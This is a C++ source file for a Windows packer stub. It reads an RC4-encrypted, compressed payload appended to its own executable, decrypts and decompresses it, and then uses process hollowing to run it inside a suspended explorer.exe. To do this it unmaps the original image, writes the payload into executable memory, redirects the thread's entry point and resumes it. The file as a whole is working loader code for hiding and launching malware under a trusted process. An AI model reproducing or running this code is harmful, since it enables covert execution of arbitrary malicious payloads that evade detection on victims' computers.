#include "packerstub.h"

#define DEBUG

VOID DbgPrint(char* msg)
{

#ifdef DEBUG
	DWORD eMsgLen, errNum = GetLastError();
	LPTSTR lpvSysMsg;

	if (msg)
		printf("%s: ", msg);
	eMsgLen = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, errNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)& lpvSysMsg, 0, NULL);
	if (eMsgLen > 0)
		_ftprintf(stderr, _T("%d %s\n"), errNum, lpvSysMsg);
	else
		_ftprintf(stderr, _T("Error %d\n"), errNum);
	if (lpvSysMsg != NULL)
		LocalFree(lpvSysMsg);
#endif
}

bool DecryptPE(std::vector<BYTE>& bin)
{
	std::vector<BYTE> pvKey(bin.end() - KEY_LEN, bin.end());
	if (pvKey.size() < 1)
	{
		return false;
	}
	bin.erase(bin.end() - KEY_LEN, bin.end());
	if (bin.size() < 1)
	{
		return false;
	}
	CRC4* rc4 = nullptr;
	rc4 = new CRC4{};
	rc4->Initialize(&pvKey.front(), KEY_LEN);
	if (rc4 == nullptr)
	{
		delete rc4;
		return false;
	}
	rc4->RC4(&bin.front(), bin.size());
	if (bin.size() < 1)
	{
		delete rc4;
		return false;
	}
	delete rc4;
	return true;
}

bool DecompressPE(std::vector<BYTE>& bin)
{
	qlz_state_decompress* state_decompress = nullptr;
	state_decompress = new qlz_state_decompress{};
	if (state_decompress == nullptr)
	{
		delete state_decompress;
		return false;
	}
	size_t dsize = qlz_size_decompressed((char*)& bin.front());
	if (dsize < 1)
	{
		delete state_decompress;
		return false;
	}
	char* dbin{};
	dbin = new char[dsize];
	size_t usize = qlz_decompress((char*)& bin.front(), dbin, state_decompress);
	if (usize < 1)
	{
		delete state_decompress;
		delete[] dbin;
		return false;
	}
	bin.resize(usize);
	std::copy(dbin, dbin + usize, &bin.front());
	if (bin.size() < 1)
	{
		delete state_decompress;
		delete[] dbin;
		return false;
	}
	delete state_decompress;
	delete[] dbin;
	return true;
}

void PE_FILE::set_sizes(size_t size_ids_, size_t size_dos_stub_, size_t size_inh32_, size_t size_ish_, size_t size_sections_)
{
	this->size_ids = size_ids_;
	this->size_dos_stub = size_dos_stub_;
	this->size_inh32 = size_inh32_;
	this->size_ish = size_ish_ + sizeof(IMAGE_SECTION_HEADER);
	this->size_sections = size_sections_;
}

PE_FILE ParsePE(const char* PE)
{
	PE_FILE pefile{};
	memcpy_s(&pefile.ids, sizeof(IMAGE_DOS_HEADER), PE, sizeof(IMAGE_DOS_HEADER));
	memcpy_s(&pefile.inh32, sizeof(IMAGE_NT_HEADERS64), PE + pefile.ids.e_lfanew, sizeof(IMAGE_NT_HEADERS64)); // address of PE header = e_lfanew
	size_t stub_size = pefile.ids.e_lfanew - 0x3c - 0x4; // 0x3c offet of e_lfanew
	pefile.MS_DOS_STUB = std::vector<char>(stub_size);
	memcpy_s(pefile.MS_DOS_STUB.data(), stub_size, (PE + 0x3c + 0x4), stub_size);

	auto number_of_sections = pefile.inh32.FileHeader.NumberOfSections;
	pefile.ish = std::vector<IMAGE_SECTION_HEADER>(number_of_sections + 1); // Number of sections

	auto PE_Header = PE + pefile.ids.e_lfanew;
	auto First_Section_Header = PE_Header + 0x18 + pefile.inh32.FileHeader.SizeOfOptionalHeader; // First Section: PE_header + sizeof FileHeader + sizeof Optional Header

																								 // copy section headers
	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		memcpy_s(&pefile.ish[i], sizeof(IMAGE_SECTION_HEADER), First_Section_Header + (i * sizeof(IMAGE_SECTION_HEADER)), sizeof(IMAGE_SECTION_HEADER));
	}

	for (auto i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		std::shared_ptr<char> t_char(new char[pefile.ish[i].SizeOfRawData]{}, std::default_delete<char[]>()); // Section
		memcpy_s(t_char.get(), pefile.ish[i].SizeOfRawData, PE + pefile.ish[i].PointerToRawData, pefile.ish[i].SizeOfRawData); // copy sections.
		pefile.Sections.push_back(t_char);
	}
	size_t sections_size{};
	for (WORD i = 0; i < pefile.inh32.FileHeader.NumberOfSections; ++i)
	{
		sections_size += pefile.ish[i].SizeOfRawData;
	}

	pefile.set_sizes(sizeof(pefile.ids), stub_size, sizeof(pefile.inh32), number_of_sections * sizeof(IMAGE_SECTION_HEADER), sections_size);

	return pefile;
}

// Based on John Leitch's paper "Process Hollowing"
BOOL ProcessReplacement(TCHAR* target, std::vector<BYTE> bin)
{
	//DbgPrint("==============Initial Processing==================");
	//DbgPrint("[ ] Parsing PE from buffer");
	auto Parsed_PE = ParsePE((char*)& bin.front());  // Get the PE_FILE object from the function (local, not a standard C++ function)
	//DbgPrint("[+] Got PE info");		// PE_FILE is defined in the Injection.h file

	auto pStartupInfo = new STARTUPINFO();  // Specifies the window station, desktop, standard handles, 
											// and appearance of the main window for a process at creation time.
											// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx

	auto remoteProcessInfo = new PROCESS_INFORMATION();  // Structure that contains the information about a process object
													// MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
	//DbgPrint("===================================================\n\n");
	//DbgPrint("============Creating Process to Infect=============");

	/* CreateProcess is a complex call so I am breaking it out into paramaters*/
	//MSDN: https://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
	//DbgPrint("[ ] Creating host process");
	CreateProcess(target,			//lpApplicationName		name of process to be executed
		nullptr,					//lpCommandLine			command line to be executed (not used so Application name is used)
		nullptr,					//lpProcessAttributes	user specified process params using SECURITY_ATTRIBUTES struct
		nullptr,					//lpThreadAttributes	user specified thread params using SECURITY_ATTRIBUTES struct
		FALSE,						//bInheritHandles		Disallow the inheritance of process handles to child processes (we are not a child thread)
		NORMAL_PRIORITY_CLASS,		//dwCreationFlags		Flag to priotiry level of the process (here we are normal)
		nullptr,					//lpEnvironment			Enviromental Vars to hand to the new process (perhaps useful for modified mimikatz?)
		nullptr,					//lpCurrentDirectory	used to declare working directory for process (normally used by shells that need to start at $HOME)
		pStartupInfo,				//lpStartupInfo			Our startupinfo object for process info
		remoteProcessInfo);			//lpProcessInformation	The processinformation object we use to manipulate the process

	if (!remoteProcessInfo->hProcess)	// no real need to check the output of Create Process because all the return info needs to be checked anyway
	{
		//DbgPrint("[-] Failed to create remote thread");
		return FALSE;
	}
	if (SuspendThread(remoteProcessInfo->hThread) == -1)	//Suspend thread to hijack
	{
		//DbgPrint("[-] Failed to stop remote process");
		return FALSE;
	}
	//DbgPrint("[+] Created host process");
	DWORD dwReturnLength;	//used later in remote call
	//DbgPrint("===================================================\n\n");
	// read remote PEB
	PROCESS_BASIC_INFORMATION ProcessBasicInformation;

	//DbgPrint("============Hijacking Remote Functions==============");
	// get NtQueryInformationProcess
	//DbgPrint("[ ] loading remote process libraries and functions to build new PEB");
	//DbgPrint("[ ] getting ntdll");
	auto handleToRemoteNtDll = LoadLibrary(L"ntdll");	//Locate NTDLL in new process memory
	if (!handleToRemoteNtDll)
	{
		//DbgPrint("[-] failed to get remote handle to NTDLL");
		return FALSE;
	}
	//DbgPrint("[+] got ntdll\n");
	//DbgPrint("[ ] getting NtQueryInformationProcess");
	auto fpNtQueryInformationProcess = GetProcAddress(handleToRemoteNtDll, "NtQueryInformationProcess");
	if (!fpNtQueryInformationProcess)
	{
		//DbgPrint("[-] Failed to locate remote NtQueryInformationProcess function");
		return FALSE;
	}
	//DbgPrint("[+] got NtQueryInformationProcess\n");
	//DbgPrint("[ ] Executing NtQueryInformationProcess");

	auto remoteNtQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(fpNtQueryInformationProcess);

	//Call remote process NtQueryInformationProcess function
	remoteNtQueryInformationProcess(remoteProcessInfo->hProcess,
		PROCESSINFOCLASS(0),
		&ProcessBasicInformation,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength);
	//DbgPrint("[+] executed NtQueryInformationProcess\n");
	auto dwPEBBAddress = ProcessBasicInformation.PebBaseAddress; //remote PEB info

	auto pPEB = new PEB(); //create new PEB object
	//DbgPrint("[ ] reading process memory to locate remote PEB");
	if (!ReadProcessMemory(remoteProcessInfo->hProcess,	// load info for PEB of remote process 
		static_cast<LPCVOID>(dwPEBBAddress),
		pPEB,
		sizeof(PEB),
		nullptr))
	{
		//DbgPrint("[-] failed to load remote PEB");
		return FALSE;
	}
	//DbgPrint("[+] read forign PEB");
	//DbgPrint("[+] parsed remote PEB\n");
	// remote image size calculation
	auto BUFFER_SIZE = sizeof IMAGE_DOS_HEADER + sizeof IMAGE_NT_HEADERS64 + (sizeof IMAGE_SECTION_HEADER) * 100;

	auto remoteProcessBuffer = new BYTE[BUFFER_SIZE];

	LPCVOID remoteImageAddressBase = pPEB->Reserved3[1]; // set forged process ImageBase to remote processes' image base
	//DbgPrint("[ ] Reading process memory to find process image");
	if (!ReadProcessMemory(remoteProcessInfo->hProcess, // read process image from loaded process (so we can replace these parts later)
		remoteImageAddressBase,
		remoteProcessBuffer,
		BUFFER_SIZE,
		nullptr))
		return FALSE;
	//DbgPrint("[+] found remote process image\n");
	// get handle to unmap remote process sections for replacement
	//DbgPrint("[ ] loading remote call to unmap");
	auto fpZwUnmapViewOfSection = GetProcAddress(handleToRemoteNtDll, "ZwUnmapViewOfSection");
	//Create callable version of remote unmap call
	auto ZwUnmapViewOfSection = reinterpret_cast<_ZwUnmapViewOfSection>(fpZwUnmapViewOfSection);

	//Unmap remote process image
	if (ZwUnmapViewOfSection(remoteProcessInfo->hProcess, const_cast<PVOID>(remoteImageAddressBase)))
	{
		//DbgPrint("[-] failed to unmap remote process image");
		return FALSE;
	}
	//DbgPrint("[+] unmap'd remote process image\n");
	// Allocating memory for our PE file
	/*

	MSDN: https://msdn.microsoft.com/ru-ru/library/windows/desktop/aa366890(v=vs.85).aspx
	*/

	//DbgPrint("[!] hijacking remote image");
	//DbgPrint("[ ] allocating memory in forign process");
	auto hijackerRemoteImage = VirtualAllocEx(remoteProcessInfo->hProcess,		//hProcess			handle to the remote process
		const_cast<LPVOID>(remoteImageAddressBase),						//lpAddress			address to allocate at (here we are using the old process image base address)
		Parsed_PE.inh32.OptionalHeader.SizeOfImage,						//dwSize			size of  allocation (our new pe's length goes here 
		MEM_COMMIT | MEM_RESERVE,										//flAllocationType	The type of memory allocation this part is system magic so RTFM at MSDN
		PAGE_EXECUTE_READWRITE);										//flProtect			Tell the kernel to allocate with these protections, which is none so... "RAWDOG IT!!!"

	if (!hijackerRemoteImage)	//if the call screws up then just die
	{
		//DbgPrint("[-] failed to allocate memory in remote process");
		return FALSE;
	}
	//DbgPrint("[+] alocated memory in remote process\n");
	// calculate relocation delta
	auto dwDelta = ULONGLONG(remoteImageAddressBase) - Parsed_PE.inh32.OptionalHeader.ImageBase;  // change to pImageAddressBase

	//Here we cast the new process to a function pointer that we will cause the remote process to execute
	Parsed_PE.inh32.OptionalHeader.ImageBase = reinterpret_cast<ULONGLONG>(remoteImageAddressBase);

	//DbgPrint("[ ] writing hijack image to remote process");
	if (!WriteProcessMemory(remoteProcessInfo->hProcess,		//hProcess					the handle to the remote process
		const_cast<LPVOID>(remoteImageAddressBase),				//lpBaseAddress				The address to start writing to
		//PE_file,												//lpBuffer					the buffer to write to the process
		&bin.front(),											//lpBuffer					the buffer to write to the process
		Parsed_PE.inh32.OptionalHeader.SizeOfHeaders,			//nSize						number of bytes to write
		nullptr))												//lpNumberOfBytesWritten	(unused) int pointer to write the return value to
	{
		//DbgPrint("[-] failed to write new headers to remote process memory");
		return FALSE;
	}

	for (WORD i = 0; i < Parsed_PE.inh32.FileHeader.NumberOfSections; ++i)
	{
		auto VirtAddress = PVOID(reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.ish[i].VirtualAddress);

		if (!WriteProcessMemory(remoteProcessInfo->hProcess,	//write new sections to the remote processes' memory 
			VirtAddress,
			Parsed_PE.Sections[i].get(),
			Parsed_PE.ish[i].SizeOfRawData,
			nullptr))
		{
			//DbgPrint("[-] failed to write one of new process sections");
			return FALSE;
		}
	}
	//DbgPrint("[+] wrote process mem");
	//DbgPrint("===================================================\n\n");
	// if delta > 0  - todo

	// cast new callable entry point from remote process base address
	auto dwEntrypoint = reinterpret_cast<ULONGLONG>(remoteImageAddressBase) + Parsed_PE.inh32.OptionalHeader.AddressOfEntryPoint;

	// Under a multitasking OS like Windows, there can be several programs running at the same time.
	// Windows gives each thread a timeslice. When that timeslice expires, 
	// Windows freezes the present thread and switches to the next thread that has the highest priority.
	// Just before switching to the other thread, Windows saves values in registers of the present thread
	// so that when the time comes to resume the thread, Windows can restore the last *environment* of that thread.
	// The saved values of the registers are collectively called a context.
	//DbgPrint("==============Hijacking Remote Process=================");
	//DbgPrint("[ ] saving debugging context of process");
	LPCONTEXT remoteProcessContext = new CONTEXT();		//This is a debugging structure to hold the old process "context" like registers and whatnot
	remoteProcessContext->ContextFlags = CONTEXT_FULL;	// A value indicating which portions of the Context structure should be initialized. This parameter influences the size of the initialized Context structure.


	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))	//get context to be used to restore process
	{
		//DbgPrint("Failed to get debugging context of remote process");
		return FALSE;
	}
	//DbgPrint("[+] saved process context\n");

	//DbgPrint("[*] modifying proc context RCX->EntryPoint()");
	remoteProcessContext->Rcx = dwEntrypoint;			//Set RCX register to the EntryPoint

	//DbgPrint("[ ] restoring modified context");
	if (!SetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		//DbgPrint("[-] failed to set remote process context");
		return FALSE;
	}
	if (!GetThreadContext(remoteProcessInfo->hThread, remoteProcessContext))
	{
		//DbgPrint("[-] failed to set control thread context");
		return FALSE;
	}
	//DbgPrint("[+] restored process context\n");

	//DbgPrint("[ ] resuming hijacked process");
	if (!ResumeThread(remoteProcessInfo->hThread))
	{
		//DbgPrint("[-] failed to resume remote process");
		return FALSE;
	}
	//DbgPrint("[!] process hijacked!");
	////////////////////////////////////////////////////////
   //////AND THATS IT, WE HAVE HIJACKED A PROCESS!!!!//////
  ////////////////////////////////////////////////////////

	CloseHandle(remoteProcessInfo->hProcess);
	return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	USES_CONVERSION;
	TCHAR* target = A2T("C:\\Windows\\explorer.exe");

	TCHAR szFileName[MAX_PATH];
	GetModuleFileName(NULL, szFileName, MAX_PATH);

	std::vector<BYTE> n_stub = OpenPE(T2A(szFileName));
	if (n_stub.size() < 1)
	{
		return 1;
	}

	std::vector<BYTE> n_vbSize(n_stub.end() - sizeof(size_t), n_stub.end());
	if (n_vbSize.size() < 1)
	{
		return 1;
	}
	n_stub.erase(n_stub.end() - sizeof(size_t), n_stub.end());
	if (n_stub.size() < 1)
	{
		return 1;
	}

	size_t n_stSize = *reinterpret_cast<size_t*>(&n_vbSize.front());
	if (n_stSize < 1)
	{
		return 1;
	}

	std::vector<BYTE> n_bin(n_stub.end() - n_stSize, n_stub.end());
	if (n_bin.size() < 1)
	{
		return 1;
	}
	n_stub.erase(n_stub.end() - n_stSize, n_stub.end());
	if (n_stub.size() < 1)
	{
		return 1;
	}

	if (!DecryptPE(n_bin))
	{
		return 1;
	}

	if (!DecompressPE(n_bin))
	{
		return 1;
	}

	if (!ProcessReplacement(target, n_bin))
	{
		return 1;
	}

	return 0;
}